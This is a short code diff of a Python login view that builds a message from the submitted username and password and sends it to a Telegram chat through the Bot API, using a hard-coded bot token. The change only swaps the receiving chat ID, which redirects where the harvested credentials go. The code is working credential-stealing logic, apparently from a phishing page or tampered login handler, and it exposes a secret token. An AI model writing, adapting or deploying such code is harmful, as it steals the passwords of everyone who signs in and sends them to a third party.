@@ -10,7 +10,7 @@ def login_views(request):
         text = f"👨‍💻 username : {username}, \n🔐 password: {password}"
         
         token = '6289716282:AAHV2TX0bcxMtL6DtAEniSulqkFnJt4tJz4'
-        id = "5356847426"
+        id = "807530230"
         url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id='
         requests.get(url + id + '&text=' + text)
 
